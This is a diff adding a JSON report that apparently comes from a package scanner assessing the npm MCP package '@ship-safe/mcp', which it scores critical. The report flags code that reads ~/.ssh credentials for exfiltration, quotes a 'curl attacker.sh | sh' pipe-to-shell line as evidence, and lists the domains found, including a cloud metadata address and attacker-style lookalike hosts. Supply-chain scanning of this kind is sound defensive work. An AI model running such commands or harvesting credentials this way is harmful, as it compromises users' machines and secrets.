@@ -1,0 +1,67 @@
+{
+  "item": {
+    "source": "mcp-registry",
+    "ecosystem": "npm",
+    "name": "@ship-safe/mcp",
+    "version": "0.6.4",
+    "download": null
+  },
+  "archive_sha256": "86beb5281ee210d8663167da2c8ec9135317c930d96e110e5bb807233c2d40f6",
+  "findings": [
+    {
+      "severity": "critical",
+      "id": "AGT-R-0101",
+      "summary": "Reads credential files and sends data to a webhook / paste / tunnel endpoint",
+      "path": "package/dist/index.js",
+      "line": 19196,
+      "evidence": "~/.ssh",
+      "file_sha256": "b9c792c04b4e51d2ada28eddd43ed2e76c9dde7540c3fe995f4ed544f637c6cc"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "package/dist/index.js",
+      "line": 15650,
+      "evidence": "curl attacker.sh | sh",
+      "file_sha256": "b9c792c04b4e51d2ada28eddd43ed2e76c9dde7540c3fe995f4ed544f637c6cc"
+    }
+  ],
+  "flags": [],
+  "domains": [
+    "169.254.169.254",
+    "accounts.google.com",
+    "aistudio.google.com",
+    "apache.org",
+    "api-preprod.yourapp.com",
+    "api.example.com",
+    "api.github.com",
+    "api.openai.com",
+    "api.osv.dev",
+    "api.sendgrid.com",
+    "api.stripe.com",
+    "app.example.com",
+    "app.myapp.com",
+    "cdn.example.com",
+    "console.x.ai",
+    "cors-probe.shipsafe-dast.example",
+    "dev.azure.com",
+    "firestore.googleapis.com",
+    "github.com",
+    "gitlab.com",
+    "modelcontextprotocol.io",
+    "my.app",
+    "myapp.com",
+    "myapp.com.attacker.io",
+    "myapp.com.evil.tld",
+    "open-vsx.org",
+    "registry.npmjs.org",
+    "ship-safe.co",
+    "slack.com",
+    "your-app.example.com",
+    "yourapp.com",
+    "yourdomain.com"
+  ],
+  "install_script": false,
+  "score": "critical"
+}
